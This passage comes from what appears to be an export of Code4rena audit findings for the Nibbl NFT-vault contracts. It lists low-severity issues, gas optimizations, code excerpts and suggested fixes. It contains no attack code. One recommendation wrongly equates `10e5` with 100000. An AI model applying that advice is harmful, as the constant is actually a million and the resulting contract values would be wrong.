./NibblVaultFactory.sol:107:        require(basketUpdateTime != 0 && block.timestamp >= basketUpdateTime, \"NibblVaultFactory: UPDATE_TIME has not passed\"); ./NibblVaultFactory.sol:131:        require(feeToUpdateTime != 0 && block.timestamp >= feeToUpdateTime, \"NibblVaultFactory: UPDATE_TIME has not passed\"); ./NibblVaultFactory.sol:141:        require(_newFee <= MAX_ADMIN_FEE, \"NibblVaultFactory: Fee value greater than MAX_ADMIN_FEE\"); ./NibblVaultFactory.sol:149:        require(feeAdminUpdateTime != 0 && block.timestamp >= feeAdminUpdateTime, \"NibblVaultFactory: UPDATE_TIME has not passed\"); ./NibblVaultFactory.sol:166:        require(vaultUpdateTime != 0 && block.timestamp >= vaultUpdateTime, \"NibblVaultFactory: UPDATE_TIME has not passed\"); ./AccessControlMechanism.sol:48:        require(pendingRoles[_role][msg.sender], \"AccessControl: Role not pending\"); ```   [G-11] Defined Variables Used Only Once  Certain variables is defined even though they are used only once. Remove these unnecessary variables to save gas. For cases where it will reduce the readability, one can use comments to help describe what the code is doing.  Issue found at  1. NibblVaultFactory.sol - Remove \"newsalt\", \"code\" and \"_hash\" variable of getVaultAddress function ``` 70:        bytes32 newsalt = keccak256(abi.encodePacked(_curator, _assetAddress, _assetTokenID,  _initialSupply, _initialTokenPrice)); 71:        bytes memory code = abi.encodePacked(type(ProxyVault).creationCode, uint256(uint160(address(this)))); 72:        bytes32 _hash = keccak256(abi.encodePacked(bytes1(0xff), address(this), newsalt, keccak256(code))); 73:        _vault = address(uint160(uint256(_hash)));      ``` - Remove \"newsalt\", \"code\" and \"hash\" variable of getBasketAddress function ``` 89:        bytes32 newsalt = keccak256(abi.encodePacked(_curator, _mix)); 90:        bytes memory code = abi.encodePacked(type(ProxyBasket).creationCode, uint256(uint160(basketImplementation))); 91:        bytes32 hash = keccak256(abi.encodePacked(bytes1(0xff), address(this), newsalt, keccak256(code))); 92:        _basket = address(uint160(uint256(hash)));      ```  2. Twav.sol - Remove \"_prevCumulativeValuation\" variable of _updateTWAV function ``` 27:        uint256 _prevCumulativeValuation = twavObservations[((twavObservationsIndex + TWAV_BLOCK_NUMBERS) - 1) % TWAV_BLOCK_NUMBERS].cumulativeValuation; 28:        twavObservations[twavObservationsIndex] = TwavObservation(_blockTimestamp, _prevCumulativeValuation + (_valuation * _timeElapsed)); //add the previous observation to make it cumulative ``` "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/196", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-06-nibbl-findings", "body": "# Basket.sol - Wrong comment in line 58, it should be ERC1155 instead of ERC721 #NibblVault.sol - Consider adding an event for the `initialize()`, `updateCurator()`. # MISC - Most of the comments in all the contracts assume that the ERC1155 token can be only NFT. This is not true because a tokenID of ERC1155 can be a fungible token. "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/181", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-06-nibbl-findings", "body": "# QA Report  ## Table of Contents  - [summary](#summary) - [hash collision with abi.encodePacked](#hash-collision-with-abi.encodepacked) - [Immutable addresses lack zero-address check](#immutable-addresses-lack-zero-address-check) - [Receive function](#receive-function) - [Setters should check the input value](#setters-should-check-the-input-value) - [Unchecked transfer](#unchecked-transfer) - [Comment Missing function parameter](#comment-missing-function-parameter) - [Commented Code](#commented-code) - [Constants instead of magic numbers](#constants-instead-of-magic-numbers) - [Event should be emitted in setters](#event-should-be-emitted-in-setters) - [Function missing comments](#function-missing-comments) - [Function order](#function-order) - [Inconsistent spacing](#inconsistent-spacing) - [Non-library files should use fixed compiler versions](#non-library-files-should-use-fixed-compiler-versions) - [Non-library files should use the same compiler version](#non-library-files-should-use-the-same-compiler-version) - [Public functions can be external](#public-functions-can-be-external) - [Require statements should have descriptive strings](#require-statements-should-have-descriptive-strings) - [Scientific notation](#scientific-notation) - [Timelock for critical parameter change](#timelock-for-critical-parameter-change) - [Uint256 alias](#uint256-alias)     # summary  > Few vulnerabilities were found, the main concerns are with potential lock of ETH in some contracts   # hash collision with abi.encodePacked  ## IMPACT  strings and bytes are encoded with padding when using `abi.encodePacked`. This can lead to [hash collision](https://docs.soliditylang.org/en/v0.8.15/abi-spec.html#non-standard-packed-mode) when passing the result to `keccak256`  ## SEVERITY  Low  ## PROOF OF CONCEPT  Instances include:  ### NibblVaultFactory.sol  [here](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L71-L72) ``` bytes memory code = abi.encodePacked(type(ProxyVault).creationCode, uint256(uint160(address(this)))); bytes32 _hash = keccak256(abi.encodePacked(bytes1(0xff), address(this), newsalt, keccak256(code))) ```  and [here](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L81), with a string ``` ProxyBasket{salt: keccak256(abi.encodePacked(_curator, _mix))}(basketImplementation)) ```   ## TOOLS USED  Manual Analysis  ## MITIGATION  Use `abi.encode()` instead.  # Immutable addresses lack zero-address check  ## IMPACT  constructors should check the address written in an immutable address variable is not the zero address  ## SEVERITY  Low  ## PROOF OF CONCEPT  Instances include:    ### ProxyBasket.sol  [implementation = payable(_implementation)](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Proxy/ProxyBasket.sol#L20)  ### ProxyVault.sol  [factory = payable(_factory)](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Proxy/ProxyVault.sol#L20)  ## TOOLS USED  Manual Analysis  ## MITIGATION  Add a zero address check for the immutable variables aforementioned.  # Receive function  ## PROBLEM  `ProxyBasket` and `ProxyDelegate` have `receive()` functions, but do not have any withdrawal function. A call to these contracts will trigger the `fallback` function. But if a call sends ETH to these contracts with no `msg.data`, `fallback` will not be triggered, only `receive()`, resulting in the ETH getting locked.  ## SEVERITY  Low  ## PROOF OF CONCEPT  ### ProxyBasket.sol  [receive() external payable {    }](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Proxy/ProxyBasket.sol#L56)  ### ProxyVault.sol  [receive() external payable {    }](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Proxy/ProxyVault.sol#L56)  ## TOOLS USED  Manual Analysis  ## MITIGATION  Add `require(0 == msg.value)` in `receive()` or remove the function altogether.   # Setters should check the input value  ## PROBLEM  Setters and initializers should check the input value - ie make revert if it is the zero address or zero  ## SEVERITY  Low  ## PROOF OF CONCEPT  Instances include:  ### NibblVault.sol  [_assetAddress lacks a check in initialize()](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L191)\\ [_curator lacks a check in initialize()](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L193)\\ [_newCurator lacks a check in updateCurator()](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L487)  ### NibblVaultFactory.sol  [_vaultImplementation lacks a check in the constructor](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L24)\\ [_feeTo lacks a check in the constructor](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L25)\\ [_basketImplementation lacks a check in the constructor](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L26)\\ [_newBasketImplementation lacks a check in proposeNewBasketImplementation](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L100)\\ [_newFeeAddress lacks a check in proposeNewAdminFeeAddress](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L124)\\ [_newVaultImplementation lacks a check in proposeNewVaultImplementation](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L158)  ## TOOLS USED  Manual Analysis  ## MITIGATION  Add non-zero checks - address - to the setters aforementioned.   # Unchecked transfer  ## PROBLEM  Several tokens do not revert in case of `ERC20.transfer()` failure and return false. It is good practice to use `safeTransfer()` from OpenZeppelin, or simply check the return value of `.transfer()`  ## SEVERITY  Low  ## PROOF OF CONCEPT  Instances include:  ### NibblVault.sol  [IERC20(_asset).transfer(_to, IERC20(_asset).balanceOf(address(this)))](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L517)\\ [IERC20(_assets[i]).transfer(_to, IERC20(_assets[i]).balanceOf(address(this)))](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L526)  ## TOOLS USED  Manual Analysis  ## MITIGATION  use `safeTransfer()` from OpenZeppelin or check the return value of `.transfer()`.   # Comment Missing function parameter  ## PROBLEM  Some of the function comments are missing function parameters or returns  ## SEVERITY  Non-Critical  ## PROOF OF CONCEPT  Instances include:  ### NibblVault.sol  [@param _totalSupply](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L275)\\ [@param _totalSupply](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L287)\\ [@param _totalSupply](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L335)\\ [@param _totalSupply](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L347)\\ [@return _saleReturn](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L362)\\ [@return _buyoutBid](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L398)\\ [@param _to](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L464)\\ [@return _amtOut](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L464)\\ [@return _feeAccruedCurator](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L474)  ### NibblVaultFactory.sol   [@return _proxyVault](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L47)\\ [@return _vault](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L69)   ## TOOLS USED  Manual Analysis  ## MITIGATION  Add a comment for these parameters  # Commented code  ## PROBLEM  There are portions of commented code in some files.  ## SEVERITY  Non-Critical  ## PROOF OF CONCEPT  Instances include:  ### NibblVault.sol  [// _purchaseReturn = _buySecondaryCurve(_to, _lowerCurveDiff)](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L321)\\ [// buyoutValuationDeposit = _currentValuation - ((primaryReserveBalance - fictitiousPrimaryReserveBalance) + secondaryReserveBalance)](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L405)  ## TOOLS USED  Manual Analysis  ## MITIGATION  Remove commented code  # Constants instead of magic numbers  ## PROBLEM  It is best practice to use constant variables rather than literal values to make the code easier to understand and maintain.  ## SEVERITY  Non-Critical  ## PROOF OF CONCEPT  Instances include:  ### NibblVault.sol  [1e18](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L183)\\ [1e18](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L195)\\ [1e18](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L226)\\ [1e18](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L253)\\ [2**32](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L303)\\ [2**32](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L365)\\ [2**32](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L413)\\ [2**32](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L445)   ## TOOLS USED  Manual Analysis  ## MITIGATION  Define constant variables for the literal values aforementioned.  # Event should be emitted in setters  ## PROBLEM  Setters should emit an event so that Dapps can detect important changes to storage  ## SEVERITY  Non-Critical  ## PROOF OF CONCEPT  Instances include:   ### NibblVault.sol  [function updateCurator](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L485)  ### NibblVaultFactory.sol  [function updateBasketImplementation](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L106)\\ [function updateNewAdminFeeAddress](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L130)\\ [function updateNewAdminFee](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L148)\\ [function updateVaultImplementation](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L165)   ## TOOLS USED  Manual Analysis  ## MITIGATION  emit an event in all setters  # Function missing comments  ## PROBLEM  Some functions are missing Natspec comments  ## SEVERITY  Non-Critical  ## PROOF OF CONCEPT  Instances include:  ### NibblVault.sol  [function permit](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L552-L565)\\ [function safeTransferETH](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L568)\\ [function onERC721Received](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L573)\\ [function onERC1155Received](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L577)\\ [function onERC1155BatchReceived](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L581)  ### NibblVaultFactory.sol  [function getVaults](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L76)\\ [function createBasket](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L80)\\ [function getBasketAddress](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L88)\\ [function withdrawAdminFee](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L112)   ### Twav.sol  [function getTwavObservations()](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Twav/Twav.sol#L44)  ### EIP712Base.sol  [function INIT_EIP712()](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Utilities/EIP712Base.sol#L15)\\ [function getChainID()](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Utilities/EIP712Base.sol#L27)  ## TOOLS USED  Manual Analysis  ## MITIGATION  Add comments to these functions  # Function order  ## PROBLEM  Functions should be ordered following the [Soldiity conventions](https://docs.soliditylang.org/en/v0.8.15/style-guide.html#order-of-functions): `receive()` function should be placed after the constructor and before every other function.  ## SEVERITY  Non-Critical  ## PROOF OF CONCEPT  Several contracts have `receive()` at the end:   - NibblVault.sol  - NibblVaultFactory.sol  - Basket.sol  ## TOOLS USED  Manual Analysis  ## MITIGATION  Place the `receive()`functions after the constructor, before all the other functions.  # Inconsistent spacing  ## PROBLEM  Spacing is present in the vast majority of comments (`// x`), but some comments do not have space.   ## SEVERITY  Non-Critical  ## PROOF OF CONCEPT  ### NibblVault.sol  [///@notice current status of vault](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L122)\\ [///@notice reenterancy guard](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L125)\\ [///@notice withdraw multiple ERC721s](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L500)   ## TOOLS USED  Manual Analysis  ## MITIGATION  Use spacings consistently in all comments.   # Non-library files should use fixed compiler versions  ## PROBLEM  contracts should be compiled using a fixed compiler version. Locking the pragma helps ensure that contracts do not accidentally get deployed using a different compiler version with which they have been tested the most   ## SEVERITY  Non-Critical     ## PROOF OF CONCEPT   `AccessControlMechanism.sol` has a floating pragma.    ## TOOLS USED  Manual Analysis    ## MITIGATION  Used a fixed compiler version  # Non-library files should use the same compiler version  ## PROBLEM  contracts within the scope should be compiled using the same compiler version.    ## SEVERITY  Non-Critical     ## PROOF OF CONCEPT  All the files in scope have the compiler version set to `0.8.10`, except for `AccessControlMechanism.sol` which has its pragma set to `^0.8.0`.   ## TOOLS USED  Manual Analysis    ## MITIGATION  Use the same compiler version throughout the contracts  # Public functions can be external  ## PROBLEM  It is good practice to mark functions as `external` instead of `public` if they are not called by the contract where they are defined.  ## SEVERITY  Non-Critical  ## PROOF OF CONCEPT  Instances include:  ### NibblVaultFactory.sol  [function getVaultAddress](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L64-L74)\\ [function getVaults](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L76-L77)\\ [function createBasket](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L80-L86)\\ [function getBasketAddress](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L88-L92)  ### Twav.sol  [function getTwavObservations](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Twav/Twav.sol#L44)  ## TOOLS USED  Manual Analysis  ## MITIGATION  Declare these functions as `external` instead of `public`  # Require statements should have descriptive strings  ## PROBLEM  Some require statements are missing error strings, which makes it more difficult to debug when the function reverts.  ### SEVERITY  Non-critical  ## PROOF OF CONCEPT   ### NibblVaultFactory.sol   [require(_success)](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L114)  ## TOOL USED  Manual Analysis  ## MITIGATION  Add error strings to all require statements.  # Scientific notation  ## PROBLEM  For readability, it is best to use scientific notation (e.g `10e5`) rather than decimal literals(`100000`) or exponentiation(`10**5`). Underscores are used throughout the contracts and do improve readability too, so this is more of a suggestion.  ## SEVERITY  Non-Critical  ## PROOF OF CONCEPT  Instances include:  ### NibblVault.sol  [uint256 private constant SCALE = 1_000_000](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L23)  ## TOOLS USED  Manual Analysis   # Timelock for critical parameter change  ## PROBLEM  It is good practice to add timelock to critical parameters changes, such as admin changes, to give users time to react.     ## SEVERITY  Non-Critical     ## PROOF OF CONCEPT  Instances include:   ### NibblVault.sol  There is no timelock in [updateCurator](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L485-L487). If the curator were to input an incorrect address here, they would lose all the curators fees accrued.   ## TOOLS USED  Manual Analysis    ## MITIGATION  Add a timelock to `updateCurator`   # Uint256 alias  ## IMPACT  `uint` is an alias for `uint256`.  It is better to use uint256: it brings readability and consistency in the code, and it future proofs it in case of any changes to the alias of uint. This is all the more valid as `uint256` is used throughout the contracts, `uint` is only used in few instances.   ## SEVERITY  Non-Critical     ## PROOF OF CONCEPT  ### Nibblvault.sol  [uint _primaryReserveBalance = (primaryReserveRatio * _initialTokenSupply * _initialTokenPrice) / (SCALE * 1e18)](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contr"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/180", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-06-nibbl-findings", "body": "# Gas Report  ## Table of Contents  - [Caching storage variables in memory to save gas](#caching-storage-variables-in-memory-to-save-gas) - [Calldata instead of memory for RO function parameters](#calldata-instead-of-memory-for-ro-function-parameters) - [Comparison operators](#comparison-operators) - [Constant expressions](#constant-expressions) - [Constructor parameters should be avoided when possible](#constructor-parameters-should-be-avoided-when-possible) - [Custom errors](#custom-errors) - [Default value initialization](#default-value-initialization) - [Immutable variables save storage](#immutable-variables-save-storage) - [Mathematical optimizations](#mathematical-optimizations) - [Modifier instead of duplicate require](#modifier-instead-of-duplicate-require) - [Prefix increments](#prefix-increments) - [Require instead of AND](#require-instead-of-and) - [Revert strings length](#revert-strings-length) - [unchecked arithmetic](#unchecked-arithmetic) - [unused import](#unused-import)    # Caching storage variables in memory to save gas  ## IMPACT  Anytime you are reading from storage more than once, it is cheaper in gas cost to cache the variable in memory: a SLOAD cost 100gas, while MLOAD and MSTORE cost 3 gas.  In particular, in `for` loops, when using the length of a storage array as the condition being checked after each loop, caching the array length in memory can yield significant gas savings if the array length is high  ## PROOF OF CONCEPT  Instances include:  ### Twav.sol  scope: `_updateTWAV()`  - `twavObservationsIndex` is read 3 times  [line 27](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Twav/Twav.sol#L27)\\ [line 28](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Twav/Twav.sol#L28)\\ [line 29](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Twav/Twav.sol#L29)    ## TOOLS USED  Manual Analysis  ## MITIGATION  cache these storage variables in memory  # Calldata instead of memory for RO function parameters  ## PROBLEM  If a reference type function parameter is read-only, it is cheaper in gas to use calldata instead of memory. Calldata is a non-modifiable, non-persistent area where function arguments are stored, and behaves mostly like memory.  Try to use calldata as a data location because it will avoid copies and also makes sure that the data cannot be modified.  ## PROOF OF CONCEPT  Instances include:  ### NibblVault.sol  [address[] memory _assetAddresses, uint256[] memory _assetIDs](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L504)\\ [address[] memory _assets](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L523)\\ [address[] memory _assets, uint256[] memory _assetIDs](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L545)   ## TOOLS USED  Manual Analysis  ## MITIGATION  Replace `memory` with `calldata`  # Comparison Operators  ## IMPACT  In the EVM, there is no opcode for ` >=` or `<=`. When using greater than or equal, two operations are performed: `>` and `=`.  Using strict comparison operators hence saves gas, approximately `20` gas in `require` and `if` statements  ## PROOF OF CONCEPT  Instances include:  ### NibblVault.sol  [buyoutEndTime <= block.timestamp](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L147)\\ [_secondaryReserveRatio <= primaryReserveRatio](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L184)\\ [_secondaryReserveRatio >= MIN_SECONDARY_RESERVE_RATIO](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L185)\\ [_totalSupply >= _initialTokenSupply](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L311)\\ [_lowerCurveDiff >= msg.value](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L315)\\ [_minAmtOut <= _purchaseReturn](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L325)\\ [_secondaryReserveBalance - _saleReturn >= MIN_SECONDARY_RESERVE_BALANCE, \"NibblVault: Excess sell\"](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L351)\\ [(_initialTokenSupply + _amtIn) <= _totalSupply](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L374)\\ [_saleReturn >= _minAmtOut, \"NibblVault: Return too low\"](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L387)\\ [block.timestamp >= minBuyoutTime, \"NibblVault: minBuyoutTime < now\"](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L399)\\ [_buyoutBid >= _currentValuation, \"NibblVault: Bid too low\"](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L404)\\ [_twav >= buyoutRejectionValuation](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L426)\\ [block.timestamp <= deadline](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L561)   ### NibblVaultFactory.sol  [msg.value >= MIN_INITIAL_RESERVE_BALANCE](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L48)\\ [block.timestamp >= basketUpdateTime](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L107)\\ [block.timestamp >= feeToUpdateTime](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L131)\\ [_newFee <= MAX_ADMIN_FEE](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L141)\\ [block.timestamp >= feeAdminUpdateTime](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L149)\\ [block.timestamp >= vaultUpdateTime](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L149)  ## TOOLS USED  Manual Analysis  ## MITIGATION  Replace `<=` with `<`, and `>=` with `>`. Do not forget to increment/decrement the compared variable  example:  ``` -block.timestamp >= basketUpdateTime +block.timestamp > basketUpdateTime - 1; ```  However, if `1` is negligible compared to the value of the variable, we can omit the increment.  ``` -block.timestamp >= basketUpdateTime +block.timestamp > basketUpdateTime; ```  # Constant expressions  ## IMPACT  Constant expressions are [re-calculated each time it is in use](https://github.com/ethereum/solidity/issues/9232), costing an extra `97` gas than a constant every time they are called.   ## PROOF OF CONCEPT  Instances include:  ### NibblVault.sol  [bytes32 private constant PERMIT_TYPEHASH = keccak256(\"Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)\")](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L51)  ### AccessControlMechanism.sol  [bytes32 public constant FEE_ROLE = keccak256(\"FEE_ROLE\")](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Utilities/AccessControlMechanism.sol#L12)\\ [bytes32 public constant PAUSER_ROLE = keccak256(\"PAUSER_ROLE\")](https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Utilities/AccessControlMechanism.sol#L13)\\ [bytes32 